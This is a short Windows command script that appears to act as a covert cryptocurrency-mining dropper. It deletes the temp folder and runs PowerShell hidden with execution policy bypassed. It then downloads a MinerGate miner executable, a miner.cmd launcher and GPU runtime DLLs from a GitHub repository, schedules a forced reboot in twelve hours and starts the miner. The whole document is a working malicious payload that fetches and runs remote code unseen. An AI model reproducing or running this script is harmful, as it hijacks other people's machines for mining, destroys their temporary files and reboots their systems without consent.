rd %temp% /s /q
cd %TMP% && powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://github.com/mediatui/tool/raw/master/multi/minergate-cli.exe
cd %TMP% && powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/miner.cmd
cd %TMP% && powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/msvcp140.dll
cd %TMP% && powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/nvrtc64_92.dll
cd %TMP% && powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/nvrtc-builtins64_92.dll
cd %TMP% && powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/OpenCL.dll
cd %TMP% && powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/vcruntime140.dll
cd %TMP% && powershell -W Hidden -Exec Bypass cmd.exe /c shutdown /r /t 43200
cd %TMP% && powershell -W Hidden -Exec Bypass cmd.exe /c miner.cmd
